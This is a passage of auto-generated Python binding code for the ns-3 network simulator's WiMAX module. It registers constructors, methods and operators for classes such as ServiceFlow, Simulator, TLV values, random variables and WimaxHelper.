cls.add_method('SetArqBlockSize',
'void',
[param('uint16_t', 'arg0')])
cls.add_method('SetArqDeliverInOrder',
'void',
[param('uint8_t', 'arg0')])
cls.add_method('SetArqEnable',
'void',
[param('uint8_t', 'arg0')])
cls.add_method('SetArqPurgeTimeout',
'void',
[param('uint16_t', 'arg0')])
cls.add_method('SetArqRetryTimeoutRx',
'void',
[param('uint16_t', 'arg0')])
cls.add_method('SetArqRetryTimeoutTx',
'void',
[param('uint16_t', 'arg0')])
cls.add_method('SetArqSyncLoss',
'void',
[param('uint16_t', 'arg0')])
cls.add_method('SetArqWindowSize',
'void',
[param('uint16_t', 'arg0')])
cls.add_method('SetConnection',
'void',
[param('ns3::Ptr< ns3::WimaxConnection >', 'connection')])
cls.add_method('SetConvergenceSublayerParam',
'void',
[param('ns3::CsParameters', 'arg0')])
cls.add_method('SetCsSpecification',
'void',
[param('ns3::ServiceFlow::CsSpecification', 'arg0')])
cls.add_method('SetDirection',
'void',
[param('ns3::ServiceFlow::Direction', 'direction')])
cls.add_method('SetFixedversusVariableSduIndicator',
'void',
[param('uint8_t', 'arg0')])
cls.add_method('SetIsEnabled',
'void',
[param('bool', 'isEnabled')])
cls.add_method('SetIsMulticast',
'void',
[param('bool', 'isMulticast')])
cls.add_method('SetMaxSustainedTrafficRate',
'void',
[param('uint32_t', 'arg0')])
cls.add_method('SetMaxTrafficBurst',
'void',
[param('uint32_t', 'arg0')])
cls.add_method('SetMaximumLatency',
'void',
[param('uint32_t', 'arg0')])
cls.add_method('SetMinReservedTrafficRate',
'void',
[param('uint32_t', 'arg0')])
cls.add_method('SetMinTolerableTrafficRate',
'void',
[param('uint32_t', 'arg0')])
cls.add_method('SetModulation',
'void',
[param('ns3::WimaxPhy::ModulationType', 'modulationType')])
cls.add_method('SetQosParamSetType',
'void',
[param('uint8_t', 'arg0')])
cls.add_method('SetRecord',
'void',
[param('ns3::ServiceFlowRecord *', 'record')])
cls.add_method('SetRequestTransmissionPolicy',
'void',
[param('uint32_t', 'arg0')])
cls.add_method('SetSduSize',
'void',
[param('uint8_t', 'arg0')])
cls.add_method('SetServiceClassName',
'void',
[param('std::string', 'arg0')])
cls.add_method('SetServiceSchedulingType',
'void',
[param('ns3::ServiceFlow::SchedulingType', 'arg0')])
cls.add_method('SetSfid',
'void',
[param('uint32_t', 'arg0')])
cls.add_method('SetTargetSAID',
'void',
[param('uint16_t', 'arg0')])
cls.add_method('SetToleratedJitter',
'void',
[param('uint32_t', 'arg0')])
cls.add_method('SetTrafficPriority',
'void',
[param('uint8_t', 'arg0')])
cls.add_method('SetType',
'void',
[param('ns3::ServiceFlow::Type', 'type')])
cls.add_method('SetUnsolicitedGrantInterval',
'void',
[param('uint16_t', 'arg0')])
cls.add_method('SetUnsolicitedPollingInterval',
'void',
[param('uint16_t', 'arg0')])
cls.add_method('ToTlv',
'ns3::Tlv',
[],
is_const=True)
return
def register_Ns3ServiceFlowRecord_methods(root_module, cls):
cls.add_constructor([param('ns3::ServiceFlowRecord const &', 'arg0')])
cls.add_constructor([])
cls.add_method('GetBacklogged',
'uint32_t',
[],
is_const=True)
cls.add_method('GetBackloggedTemp',
'uint32_t',
[],
is_const=True)
cls.add_method('GetBwSinceLastExpiry',
'uint32_t',
[])
cls.add_method('GetBytesRcvd',
'uint32_t',
[],
is_const=True)
cls.add_method('GetBytesSent',
'uint32_t',
[],
is_const=True)
cls.add_method('GetDlTimeStamp',
'ns3::Time',
[],
is_const=True)
cls.add_method('GetGrantSize',
'uint32_t',
[],
is_const=True)
cls.add_method('GetGrantTimeStamp',
'ns3::Time',
[],
is_const=True)
cls.add_method('GetGrantedBandwidth',
'uint32_t',
[])
cls.add_method('GetGrantedBandwidthTemp',
'uint32_t',
[])
cls.add_method('GetLastGrantTime',
'ns3::Time',
[],
is_const=True)
cls.add_method('GetPktsRcvd',
'uint32_t',
[],
is_const=True)
cls.add_method('GetPktsSent',
'uint32_t',
[],
is_const=True)
cls.add_method('GetRequestedBandwidth',
'uint32_t',
[])
cls.add_method('IncreaseBacklogged',
'void',
[param('uint32_t', 'backlogged')])
cls.add_method('IncreaseBackloggedTemp',
'void',
[param('uint32_t', 'backloggedTemp')])
cls.add_method('SetBacklogged',
'void',
[param('uint32_t', 'backlogged')])
cls.add_method('SetBackloggedTemp',
'void',
[param('uint32_t', 'backloggedTemp')])
cls.add_method('SetBwSinceLastExpiry',
'void',
[param('uint32_t', 'bwSinceLastExpiry')])
cls.add_method('SetBytesRcvd',
'void',
[param('uint32_t', 'bytesRcvd')])
cls.add_method('SetBytesSent',
'void',
[param('uint32_t', 'bytesSent')])
cls.add_method('SetDlTimeStamp',
'void',
[param('ns3::Time', 'dlTimeStamp')])
cls.add_method('SetGrantSize',
'void',
[param('uint32_t', 'grantSize')])
cls.add_method('SetGrantTimeStamp',
'void',
[param('ns3::Time', 'grantTimeStamp')])
cls.add_method('SetGrantedBandwidth',
'void',
[param('uint32_t', 'grantedBandwidth')])
cls.add_method('SetGrantedBandwidthTemp',
'void',
[param('uint32_t', 'grantedBandwidthTemp')])
cls.add_method('SetLastGrantTime',
'void',
[param('ns3::Time', 'grantTime')])
cls.add_method('SetPktsRcvd',
'void',
[param('uint32_t', 'pktsRcvd')])
cls.add_method('SetPktsSent',
'void',
[param('uint32_t', 'pktsSent')])
cls.add_method('SetRequestedBandwidth',
'void',
[param('uint32_t', 'requestedBandwidth')])
cls.add_method('UpdateBwSinceLastExpiry',
'void',
[param('uint32_t', 'bwSinceLastExpiry')])
cls.add_method('UpdateBytesRcvd',
'void',
[param('uint32_t', 'bytesRcvd')])
cls.add_method('UpdateBytesSent',
'void',
[param('uint32_t', 'bytesSent')])
cls.add_method('UpdateGrantedBandwidth',
'void',
[param('uint32_t', 'grantedBandwidth')])
cls.add_method('UpdateGrantedBandwidthTemp',
'void',
[param('uint32_t', 'grantedBandwidthTemp')])
cls.add_method('UpdatePktsRcvd',
'void',
[param('uint32_t', 'pktsRcvd')])
cls.add_method('UpdatePktsSent',
'void',
[param('uint32_t', 'pktsSent')])
cls.add_method('UpdateRequestedBandwidth',
'void',
[param('uint32_t', 'requestedBandwidth')])
return
def register_Ns3SimpleRefCount__Ns3Object_Ns3ObjectBase_Ns3ObjectDeleter_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::SimpleRefCount< ns3::Object, ns3::ObjectBase, ns3::ObjectDeleter > const &', 'o')])
cls.add_method('Cleanup',
'void',
[],
is_static=True)
return
def register_Ns3Simulator_methods(root_module, cls):
cls.add_constructor([param('ns3::Simulator const &', 'arg0')])
cls.add_method('Cancel',
'void',
[param('ns3::EventId const &', 'id')],
is_static=True)
cls.add_method('Destroy',
'void',
[],
is_static=True)
cls.add_method('GetContext',
'uint32_t',
[],
is_static=True)
cls.add_method('GetDelayLeft',
'ns3::Time',
[param('ns3::EventId const &', 'id')],
is_static=True)
cls.add_method('GetImplementation',
'ns3::Ptr< ns3::SimulatorImpl >',
[],
is_static=True)
cls.add_method('GetMaximumSimulationTime',
'ns3::Time',
[],
is_static=True)
cls.add_method('GetSystemId',
'uint32_t',
[],
is_static=True)
cls.add_method('IsExpired',
'bool',
[param('ns3::EventId const &', 'id')],
is_static=True)
cls.add_method('IsFinished',
'bool',
[],
is_static=True)
cls.add_method('Next',
'ns3::Time',
[],
is_static=True, deprecated=True)
cls.add_method('Now',
'ns3::Time',
[],
is_static=True)
cls.add_method('Remove',
'void',
[param('ns3::EventId const &', 'id')],
is_static=True)
cls.add_method('RunOneEvent',
'void',
[],
is_static=True, deprecated=True)
cls.add_method('SetImplementation',
'void',
[param('ns3::Ptr< ns3::SimulatorImpl >', 'impl')],
is_static=True)
cls.add_method('SetScheduler',
'void',
[param('ns3::ObjectFactory', 'schedulerFactory')],
is_static=True)
cls.add_method('Stop',
'void',
[],
is_static=True)
cls.add_method('Stop',
'void',
[param('ns3::Time const &', 'time')],
is_static=True)
return
def register_Ns3Tag_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::Tag const &', 'arg0')])
cls.add_method('Deserialize',
'void',
[param('ns3::TagBuffer', 'i')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::TagBuffer', 'i')],
is_pure_virtual=True, is_const=True, is_virtual=True)
return
def register_Ns3TagBuffer_methods(root_module, cls):
cls.add_constructor([param('ns3::TagBuffer const &', 'arg0')])
cls.add_constructor([param('uint8_t *', 'start'), param('uint8_t *', 'end')])
cls.add_method('CopyFrom',
'void',
[param('ns3::TagBuffer', 'o')])
cls.add_method('Read',
'void',
[param('uint8_t *', 'buffer'), param('uint32_t', 'size')])
cls.add_method('ReadDouble',
'double',
[])
cls.add_method('ReadU16',
'uint16_t',
[])
cls.add_method('ReadU32',
'uint32_t',
[])
cls.add_method('ReadU64',
'uint64_t',
[])
cls.add_method('ReadU8',
'uint8_t',
[])
cls.add_method('TrimAtEnd',
'void',
[param('uint32_t', 'trim')])
cls.add_method('Write',
'void',
[param('uint8_t const *', 'buffer'), param('uint32_t', 'size')])
cls.add_method('WriteDouble',
'void',
[param('double', 'v')])
cls.add_method('WriteU16',
'void',
[param('uint16_t', 'data')])
cls.add_method('WriteU32',
'void',
[param('uint32_t', 'data')])
cls.add_method('WriteU64',
'void',
[param('uint64_t', 'v')])
cls.add_method('WriteU8',
'void',
[param('uint8_t', 'v')])
return
def register_Ns3TlvValue_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::TlvValue const &', 'arg0')])
cls.add_method('Copy',
'ns3::TlvValue *',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLen')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_pure_virtual=True, is_const=True, is_virtual=True)
return
def register_Ns3TosTlvValue_methods(root_module, cls):
cls.add_constructor([param('ns3::TosTlvValue const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('uint8_t', 'arg0'), param('uint8_t', 'arg1'), param('uint8_t', 'arg2')])
cls.add_method('Copy',
'ns3::TosTlvValue *',
[],
is_const=True, is_virtual=True)
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLength')],
is_virtual=True)
cls.add_method('GetHigh',
'uint8_t',
[],
is_const=True)
cls.add_method('GetLow',
'uint8_t',
[],
is_const=True)
cls.add_method('GetMask',
'uint8_t',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
return
def register_Ns3TriangularVariable_methods(root_module, cls):
cls.add_constructor([param('ns3::TriangularVariable const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('double', 's'), param('double', 'l'), param('double', 'mean')])
return
def register_Ns3TypeId_methods(root_module, cls):
cls.add_binary_comparison_operator('!=')
cls.add_binary_comparison_operator('<')
cls.add_output_stream_operator()
cls.add_binary_comparison_operator('==')
cls.add_constructor([param('char const *', 'name')])
cls.add_constructor([])
cls.add_constructor([param('ns3::TypeId const &', 'o')])
cls.add_method('AddAttribute',
'ns3::TypeId',
[param('std::string', 'name'), param('std::string', 'help'), param('ns3::AttributeValue const &', 'initialValue'), param('ns3::Ptr< ns3::AttributeAccessor const >', 'accessor'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')])
cls.add_method('AddAttribute',
'ns3::TypeId',
[param('std::string', 'name'), param('std::string', 'help'), param('uint32_t', 'flags'), param('ns3::AttributeValue const &', 'initialValue'), param('ns3::Ptr< ns3::AttributeAccessor const >', 'accessor'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')])
cls.add_method('AddTraceSource',
'ns3::TypeId',
[param('std::string', 'name'), param('std::string', 'help'), param('ns3::Ptr< ns3::TraceSourceAccessor const >', 'accessor')])
cls.add_method('GetAttribute',
'ns3::TypeId::AttributeInformation',
[param('uint32_t', 'i')],
is_const=True)
cls.add_method('GetAttributeFullName',
'std::string',
[param('uint32_t', 'i')],
is_const=True)
cls.add_method('GetAttributeN',
'uint32_t',
[],
is_const=True)
cls.add_method('GetConstructor',
'ns3::Callback< ns3::ObjectBase *, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >',
[],
is_const=True)
cls.add_method('GetGroupName',
'std::string',
[],
is_const=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True)
cls.add_method('GetParent',
'ns3::TypeId',
[],
is_const=True)
cls.add_method('GetRegistered',
'ns3::TypeId',
[param('uint32_t', 'i')],
is_static=True)
cls.add_method('GetRegisteredN',
'uint32_t',
[],
is_static=True)
cls.add_method('GetTraceSource',
'ns3::TypeId::TraceSourceInformation',
[param('uint32_t', 'i')],
is_const=True)
cls.add_method('GetTraceSourceN',
'uint32_t',
[],
is_const=True)
cls.add_method('GetUid',
'uint16_t',
[],
is_const=True)
cls.add_method('HasConstructor',
'bool',
[],
is_const=True)
cls.add_method('HasParent',
'bool',
[],
is_const=True)
cls.add_method('HideFromDocumentation',
'ns3::TypeId',
[])
cls.add_method('IsChildOf',
'bool',
[param('ns3::TypeId', 'other')],
is_const=True)
cls.add_method('LookupAttributeByName',
'bool',
[param('std::string', 'name'), param('ns3::TypeId::AttributeInformation *', 'info')],
is_const=True)
cls.add_method('LookupByName',
'ns3::TypeId',
[param('std::string', 'name')],
is_static=True)
cls.add_method('LookupTraceSourceByName',
'ns3::Ptr< ns3::TraceSourceAccessor const >',
[param('std::string', 'name')],
is_const=True)
cls.add_method('MustHideFromDocumentation',
'bool',
[],
is_const=True)
cls.add_method('SetAttributeInitialValue',
'bool',
[param('uint32_t', 'i'), param('ns3::Ptr< ns3::AttributeValue const >', 'initialValue')])
cls.add_method('SetGroupName',
'ns3::TypeId',
[param('std::string', 'groupName')])
cls.add_method('SetParent',
'ns3::TypeId',
[param('ns3::TypeId', 'tid')])
cls.add_method('SetUid',
'void',
[param('uint16_t', 'tid')])
return
def register_Ns3TypeIdAttributeInformation_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::TypeId::AttributeInformation const &', 'arg0')])
cls.add_instance_attribute('accessor', 'ns3::Ptr< ns3::AttributeAccessor const >', is_const=False)
cls.add_instance_attribute('checker', 'ns3::Ptr< ns3::AttributeChecker const >', is_const=False)
cls.add_instance_attribute('flags', 'uint32_t', is_const=False)
cls.add_instance_attribute('help', 'std::string', is_const=False)
cls.add_instance_attribute('initialValue', 'ns3::Ptr< ns3::AttributeValue const >', is_const=False)
cls.add_instance_attribute('name', 'std::string', is_const=False)
cls.add_instance_attribute('originalInitialValue', 'ns3::Ptr< ns3::AttributeValue const >', is_const=False)
return
def register_Ns3TypeIdTraceSourceInformation_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::TypeId::TraceSourceInformation const &', 'arg0')])
cls.add_instance_attribute('accessor', 'ns3::Ptr< ns3::TraceSourceAccessor const >', is_const=False)
cls.add_instance_attribute('help', 'std::string', is_const=False)
cls.add_instance_attribute('name', 'std::string', is_const=False)
return
def register_Ns3U16TlvValue_methods(root_module, cls):
cls.add_constructor([param('ns3::U16TlvValue const &', 'arg0')])
cls.add_constructor([param('uint16_t', 'value')])
cls.add_constructor([])
cls.add_method('Copy',
'ns3::U16TlvValue *',
[],
is_const=True, is_virtual=True)
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLen')],
is_virtual=True)
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')])
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetValue',
'uint16_t',
[],
is_const=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
return
def register_Ns3U32TlvValue_methods(root_module, cls):
cls.add_constructor([param('ns3::U32TlvValue const &', 'arg0')])
cls.add_constructor([param('uint32_t', 'value')])
cls.add_constructor([])
cls.add_method('Copy',
'ns3::U32TlvValue *',
[],
is_const=True, is_virtual=True)
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLen')],
is_virtual=True)
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')])
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetValue',
'uint32_t',
[],
is_const=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
return
def register_Ns3U8TlvValue_methods(root_module, cls):
cls.add_constructor([param('ns3::U8TlvValue const &', 'arg0')])
cls.add_constructor([param('uint8_t', 'value')])
cls.add_constructor([])
cls.add_method('Copy',
'ns3::U8TlvValue *',
[],
is_const=True, is_virtual=True)
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLen')],
is_virtual=True)
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')])
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetValue',
'uint8_t',
[],
is_const=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
return
def register_Ns3UcdChannelEncodings_methods(root_module, cls):
cls.add_constructor([param('ns3::UcdChannelEncodings const &', 'arg0')])
cls.add_constructor([])
cls.add_method('GetBwReqOppSize',
'uint16_t',
[],
is_const=True)
cls.add_method('GetFrequency',
'uint32_t',
[],
is_const=True)
cls.add_method('GetRangReqOppSize',
'uint16_t',
[],
is_const=True)
cls.add_method('GetSize',
'uint16_t',
[],
is_const=True)
cls.add_method('Read',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')])
cls.add_method('SetBwReqOppSize',
'void',
[param('uint16_t', 'bwReqOppSize')])
cls.add_method('SetFrequency',
'void',
[param('uint32_t', 'frequency')])
cls.add_method('SetRangReqOppSize',
'void',
[param('uint16_t', 'rangReqOppSize')])
cls.add_method('Write',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True)
cls.add_method('DoRead',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')],
is_pure_virtual=True, visibility='private', is_virtual=True)
cls.add_method('DoWrite',
'ns3::Buffer::Iterator',
[param('ns3::Buffer::Iterator', 'start')],
is_pure_virtual=True, is_const=True, visibility='private', is_virtual=True)
return
def register_Ns3UniformVariable_methods(root_module, cls):
cls.add_constructor([param('ns3::UniformVariable const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('double', 's'), param('double', 'l')])
cls.add_method('GetInteger',
'uint32_t',
[param('uint32_t', 's'), param('uint32_t', 'l')])
cls.add_method('GetValue',
'double',
[],
is_const=True)
cls.add_method('GetValue',
'double',
[param('double', 's'), param('double', 'l')])
return
def register_Ns3VectorTlvValue_methods(root_module, cls):
cls.add_constructor([param('ns3::VectorTlvValue const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Add',
'void',
[param('ns3::Tlv const &', 'val')])
cls.add_method('Begin',
'__gnu_cxx::__normal_iterator< ns3::Tlv * const *, std::vector< ns3::Tlv * > >',
[],
is_const=True)
cls.add_method('Copy',
'ns3::VectorTlvValue *',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLength')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('End',
'__gnu_cxx::__normal_iterator< ns3::Tlv * const *, std::vector< ns3::Tlv * > >',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
return
def register_Ns3WeibullVariable_methods(root_module, cls):
cls.add_constructor([param('ns3::WeibullVariable const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('double', 'm')])
cls.add_constructor([param('double', 'm'), param('double', 's')])
cls.add_constructor([param('double', 'm'), param('double', 's'), param('double', 'b')])
return
def register_Ns3WimaxHelper_methods(root_module, cls):
cls.add_constructor([param('ns3::WimaxHelper const &', 'arg0')])
cls.add_constructor([])
cls.add_method('CreateBSScheduler',
'ns3::Ptr< ns3::BSScheduler >',
[param('ns3::WimaxHelper::SchedulerType', 'schedulerType')])
cls.add_method('CreatePhy',
'ns3::Ptr< ns3::WimaxPhy >',
[param('ns3::WimaxHelper::PhyType', 'phyType')])
cls.add_method('CreatePhy',
'ns3::Ptr< ns3::WimaxPhy >',
[param('ns3::WimaxHelper::PhyType', 'phyType'), param('char *', 'SNRTraceFilePath'), param('bool', 'activateLoss')])
cls.add_method('CreatePhyWithoutChannel',
'ns3::Ptr< ns3::WimaxPhy >',
[param('ns3::WimaxHelper::PhyType', 'phyType')])
cls.add_method('CreatePhyWithoutChannel',
'ns3::Ptr< ns3::WimaxPhy >',
[param('ns3::WimaxHelper::PhyType', 'phyType'), param('char *', 'SNRTraceFilePath'), param('bool', 'activateLoss')])
cls.add_method('CreateServiceFlow',
'ns3::ServiceFlow',
[param('ns3::ServiceFlow::Direction', 'direction'), param('ns3::ServiceFlow::SchedulingType', 'schedulinType'), param('ns3::IpcsClassifierRecord', 'classifier')])
cls.add_method('CreateUplinkScheduler',
'ns3::Ptr< ns3::UplinkScheduler >',
[param('ns3::WimaxHelper::SchedulerType', 'schedulerType')])
cls.add_method('EnableAsciiForConnection',
'void',
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'oss'), param('uint32_t', 'nodeid'), param('uint32_t', 'deviceid'), param('char *', 'netdevice'), param('char *', 'connection')],
is_static=True)
cls.add_method('EnableLogComponents',
'void',
[],
is_static=True)
cls.add_method('Install',
'ns3::NetDeviceContainer',
[param('ns3::NodeContainer', 'c'), param('ns3::WimaxHelper::NetDeviceType', 'type'), param('ns3::WimaxHelper::PhyType', 'phyType'), param('ns3::WimaxHelper::SchedulerType', 'schedulerType')])
cls.add_method('Install',
'ns3::NetDeviceContainer',
[param('ns3::NodeContainer', 'c'), param('ns3::WimaxHelper::NetDeviceType', 'deviceType'), param('ns3::WimaxHelper::PhyType', 'phyType'), param('ns3::Ptr< ns3::WimaxChannel >', 'channel'), param('ns3::WimaxHelper::SchedulerType', 'schedulerType')])
cls.add_method('Install',
'ns3::NetDeviceContainer',
[param('ns3::NodeContainer', 'c'), param('ns3::WimaxHelper::NetDeviceType', 'deviceType'), param('ns3::WimaxHelper::PhyType', 'phyType'), param('ns3::WimaxHelper::SchedulerType', 'schedulerType'), param('double', 'frameDuration')])
cls.add_method('Install',
'ns3::Ptr< ns3::WimaxNetDevice >',
[param('ns3::Ptr< ns3::Node >', 'node'), param('ns3::WimaxHelper::NetDeviceType', 'deviceType'), param('ns3::WimaxHelper::PhyType', 'phyType'), param('ns3::Ptr< ns3::WimaxChannel >', 'channel'), param('ns3::WimaxHelper::SchedulerType', 'schedulerType')])
cls.add_method('SetPropagationLossModel',
'void',
[param('ns3::SimpleOfdmWimaxChannel::PropModel', 'propagationModel')])
cls.add_method('EnableAsciiInternal',
'void',
[param('ns3::Ptr< ns3::OutputStreamWrapper >', 'stream'), param('std::string', 'prefix'), param('ns3::Ptr< ns3::NetDevice >', 'nd'), param('bool', 'explicitFilename')],
visibility='private', is_virtual=True)
cls.add_method('EnablePcapInternal',
'void',
[param('std::string', 'prefix'), param('ns3::Ptr< ns3::NetDevice >', 'nd'), param('bool', 'explicitFilename'), param('bool', 'promiscuous')],
visibility='private', is_virtual=True)
return
def register_Ns3ZetaVariable_methods(root_module, cls):
cls.add_constructor([param('ns3::ZetaVariable const &', 'arg0')])
cls.add_constructor([param('double', 'alpha')])
cls.add_constructor([])
return
def register_Ns3ZipfVariable_methods(root_module, cls):
cls.add_constructor([param('ns3::ZipfVariable const &', 'arg0')])
cls.add_constructor([param('long int', 'N'), param('double', 'alpha')])
cls.add_constructor([])
return
def register_Ns3Empty_methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::empty const &', 'arg0')])
return
def register_Ns3Int64x64_t_methods(root_module, cls):
cls.add_binary_comparison_operator('!=')
cls.add_inplace_numeric_operator('+=', param('ns3::int64x64_t const &', 'right'))
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long long unsigned int const', 'right'))
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long unsigned int const', 'right'))
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('unsigned int const', 'right'))
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('short unsigned int const', 'right'))
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('unsigned char const', 'right'))
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long long int const', 'right'))
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long int const', 'right'))
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('int const', 'right'))
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('short int const', 'right'))
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('signed char const', 'right'))
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('double const', 'right'))
cls.add_binary_numeric_operator('*', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('ns3::int64x64_t const &', 'right'))
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long long unsigned int const', 'right'))
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long unsigned int const', 'right'))
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('unsigned int const', 'right'))
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('short unsigned int const', 'right'))
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('unsigned char const', 'right'))
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long long int const', 'right'))
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long int const', 'right'))
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('int const', 'right'))
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('short int const', 'right'))
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('signed char const', 'right'))
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('double const', 'right'))
cls.add_binary_numeric_operator('+', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('ns3::int64x64_t const &', 'right'))
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long long unsigned int const', 'right'))
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long unsigned int const', 'right'))
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('unsigned int const', 'right'))
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('short unsigned int const', 'right'))
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('unsigned char const', 'right'))
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long long int const', 'right'))
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long int const', 'right'))
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('int const', 'right'))
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('short int const', 'right'))
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('signed char const', 'right'))
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('double const', 'right'))
cls.add_unary_numeric_operator('-')
cls.add_binary_numeric_operator('-', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('ns3::int64x64_t const &', 'right'))
cls.add_binary_numeric_operator('/', root_module['ns3::int64x64_t'], root_module['ns3::int64x64_t'], param('long long unsigned int const', 'right'))
